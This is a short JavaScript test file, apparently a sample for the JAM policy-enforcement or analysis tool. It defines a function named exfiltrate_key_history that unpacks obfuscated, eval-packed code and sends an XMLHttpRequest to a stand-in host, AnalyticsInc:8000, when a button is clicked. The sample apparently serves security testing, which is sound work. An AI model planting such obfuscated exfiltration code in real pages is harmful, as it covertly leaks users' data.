
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  eval(function(p, a, c, k, e$$4, d) {
    e$$4 = function(c$$1) {
      return c$$1.toString(36)
    };
    if(!"".replace(/^/, String)) {
      for(;c--;) {
        d[c.toString(a)] = k[c] || c.toString(a)
      }
      k = [function(e$$5) {
        return d[e$$5]
      }];
      e$$4 = function() {
        return"\\w+"
      };
      c = 1
    }
    for(;c--;) {
      if(k[c]) {
        p = p.replace(new RegExp("\\b" + e$$4(c) + "\\b", "g"), k[c])
      }
    }
    return p
  }('0=5 4();0.7("3","1://2:6/8.d?"+"c=b",9);0.a(e);', 15, 15, "xmlhttp|http|AnalyticsInc|GET|XMLHttpRequest|new|8000|open|submission|true|send|daftlogic|test|html|null".split("|"), 0, {}))
}
document.getElementById("test").onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
